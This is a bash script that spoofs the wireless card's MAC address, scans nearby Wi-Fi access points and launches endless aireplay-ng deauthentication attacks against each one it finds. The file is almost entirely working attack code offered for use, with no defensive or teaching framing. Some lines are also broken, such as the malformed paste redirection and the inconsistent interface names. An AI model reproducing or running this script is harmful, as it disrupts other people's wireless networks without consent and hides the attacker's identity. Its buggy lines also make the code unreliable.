#!/bin/bash

function cleanup()
{

clear
echo -e "getting out of monitor mode"
airmon-ng stop wlan0mon
sleep 2
ifconfig wlan0 up
clear
echo "thanks for using my script"
}

echo -e "\e[36m "
iwconfig
echo -e "\e[31mtype the name of your wireless card\e[36m"
read wire

ifconfig $wire down
macchanger -r $wire
ifconfig $wire up

echo "Scanning all the AP's and temporarily saving them"
iwlist $wire scan > /tmp/scan.tmp
cat /tmp/scan.tmp | egrep "Address|Channel:" | cut -d \- -f 2 | sed -e "s/Address: //" | sed -e "s/Channel://" > /tmp/APad.tmp

echo "Your wireless card is now spoofing its mac address and getting in monitor mode"

airmon-ng start wlan0
airmon-ng check kill
clear
echo -e "\e[31mpress enter to deauth all"
echo -e "when you are done press ctrl+c\e[36m"
read
trap cleanup EXIT	
cd ~
cd ..
cd tmp
paste APad.tmp > channels.tmp > all.tmp
exec 5< /tmp/all.tmp

	while read line1 <&5 ; do
        read line2 <&5	
			
		echo " It is now Deauthing $line1 on channel $line2 "
		echo
		
	xterm -e "airodump-ng --bssid $line1 -c $line2 $wire""mon" &
	sleep 4
	xterm -e "aireplay-ng -0 0 -a $line1 $wire""mon" & 
	sleep 4

done
